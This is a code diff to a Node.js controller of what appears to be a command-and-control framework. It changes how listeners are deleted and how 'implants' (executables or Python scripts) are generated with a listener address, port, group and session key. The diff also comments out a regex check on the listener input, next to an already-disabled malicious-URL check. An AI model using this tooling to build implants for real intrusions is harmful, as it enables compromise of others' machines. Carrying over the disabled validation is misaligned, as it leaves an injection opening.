@@ -263,14 +263,16 @@ const delete_listener= async( req, res = response, listeners) => {
 
         await Listener.findByIdAndDelete(found_listener._id);
 
-        
-        try {
-            const folder = resolve(found_listener.path_cert); 
-            await rm(folder, { recursive: true, force: true });
-        } catch (error) {
-            console.error('Error deleting certs folder:', error);
-        }
 
+        if(found_listener.ssl_tls){
+            try {
+                const folder = resolve(found_listener.path_cert); 
+                await rm(folder, { recursive: true, force: true });
+            } catch (error) {
+                console.error('Error deleting certs folder:', error);
+            }
+        }
+        
 
         return res.status(200).json({
             ok:true,
@@ -292,14 +294,19 @@ const delete_listener= async( req, res = response, listeners) => {
 const create_implant_controller = async(req, res=response)=>{
 
     try {
-        const { type="", system="", arch="", listener=0, group="default" } = req.body;
+        const { type="", system="", arch="", listener=0, group="default", sess_key="" } = req.body;
 
 
         let implant_path="";
 
-        if(arch != "x64" && arch != "x86") return res.status(400).json({
+        if(arch != "x64") return res.status(400).json({
             ok:false,
             msg:"Invalid arch"
+        })
+
+        if(sess_key.length < 10) return res.status(400).json({
+            ok:false,
+            msg:"Session key must have 10 or more characters"
         })
 
         switch (system) {
@@ -340,7 +347,7 @@ const create_implant_controller = async(req, res=response)=>{
                 ok:false,
                 msg:"Blocked due to malicious url"
             })
-        } */
+        }
         if( !/^[\w\-]+$/.test(listener)){
             return res.status(400).json({
                 ok:false,
@@ -348,7 +355,7 @@ const create_implant_controller = async(req, res=response)=>{
             })
         }
 
-
+ */
 
         switch (found_listener.ssl_tls) {
             case true:
@@ -375,13 +382,13 @@ const create_implant_controller = async(req, res=response)=>{
                 ext = system === "windows" ? "exe" : "elf"
                 implant_path = `${implant_path}/exe/base_${arch}.${ext}`;
                 implant_path = path.normalize(implant_path);
-                result_path = await exe_processing(implant_path, found_listener.url, found_listener.port, group, system)
+                result_path = await exe_processing(implant_path, found_listener.url, found_listener.port, group, system, sess_key)
                 break;
             }
             case "py":{
                 implant_path = `${implant_path}/python/base.py`;
                 implant_path = path.normalize(implant_path);
-                result_path = await python_processing(implant_path, found_listener.url, found_listener.port, group, system)
+                result_path = await python_processing(implant_path, found_listener.url, found_listener.port, group, system, sess_key)
                 ext='py'
                 break;
             }
